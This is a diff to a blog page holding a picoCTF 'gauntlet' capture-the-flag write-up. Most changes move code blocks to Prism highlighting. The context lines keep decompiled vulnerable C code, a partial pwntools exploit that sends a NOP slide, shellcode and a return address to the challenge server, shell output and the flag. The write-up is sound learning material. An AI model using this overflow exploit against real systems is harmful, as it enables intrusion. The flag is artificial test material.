@@ -15,6 +15,7 @@
 
     <!-- Theme CSS -->
     <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/prism.css">
 </head>
 <body class="theme-bg-light">
 
@@ -33,7 +34,7 @@
 
                 <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
                 <ul class="social-list list-inline py-3 mx-auto">
-                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://twitter.com/Abraxus7331" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
                 </ul><!--//social-list-->
@@ -73,13 +74,12 @@
 <p>Comments: How does ASLR affect your exploit? gauntlet nc mercury.picoctf.net 49704</p>
 <h2 id="write-up">Write up:</h2>
 <p>Reversing the program we see the following:</p>
-<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
-<span style="color:Blue;">int</span> __cdecl main(<span style="color:Blue;">int</span> argc, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **argv, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **envp)
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  <span style="color:Blue;">char</span> dest[104]; 
-  <span style="color:Blue;">char</span> *s;
+  char dest[104]; 
+  char *s;
 
-  s = (<span style="color:Blue;">char</span> *)malloc(1000uLL);
+  s = (char *)malloc(1000uLL);
   fgets(s, 1000, stdin);
   s[999] = 0;
   printf(s);
@@ -87,14 +87,12 @@
   fgets(s, 1000, stdin);
   s[999] = 0;
   strcpy(dest, s);
-  <span style="color:Blue;">return</span> 0;
-}
-</pre></div>
-</div>
+  return 0;
+}</code></pre>
 <p>As you can see its basically the same as gauntlet 1. I was able to check the overflow and saw that the 120 overflow worked just like last time. The only issue is that for this one we do not have the address to return to. So I started doing some dynamic analysis.</p>
 <p>My first idea was to try to find a relative offset to the address of dest from an address we can get off of the stack. Doing some dynamic analysis I found that an address from the stack was 0x168 away from dest.</p>
 <p>I then built an exploit which worked on my local system, this exploit however did not work on their side, so I added NOPs before the shellcode for a NOP slide and shortened the jump:</p>
-<div class="lang-python editor-colors"># import pwn tools
+<pre><code class="language-python"># import pwn tools
 from pwn import *
 
 # open remote connection
@@ -128,10 +126,9 @@ payload = NOPSLIDE + shellcode + NOPS + p64(address)
 r.send(payload + b'\n')
 
 # get interactive mode
-r.interactive()
-</div>
+r.interactive()</code></pre>
 <p>When run this gets us:</p>
-<pre><code>[+] Opening connection to mercury.picoctf.net on port 49704: Done
+<pre><code class="language-text">[+] Opening connection to mercury.picoctf.net on port 49704: Done
 [*] Switching to interactive mode
 
 $ ls
@@ -140,12 +137,9 @@ gauntlet
 xinet_startup.sh
 
 $ cat flag.txt
-230fc5c335f1fe302abdc387d498fe40
-</code></pre>
+230fc5c335f1fe302abdc387d498fe40</code></pre>
 <p>With the flag being:</p>
-<pre><code>230fc5c335f1fe302abdc387d498fe40
-</code></pre>
-
+<pre><code class="language-text">230fc5c335f1fe302abdc387d498fe40</code></pre>
         </article>
 
         <footer class="footer text-left py-2 theme-bg-dark">
@@ -158,5 +152,6 @@ $ cat flag.txt
     <!-- Javascript -->
     <script src="../../assets/js/popper.min.js"></script>
     <script src="../../assets/js/bootstrap.min.js"></script>
+    <script src="../../assets/js/prism.js"></script>
 </body>
 </html>
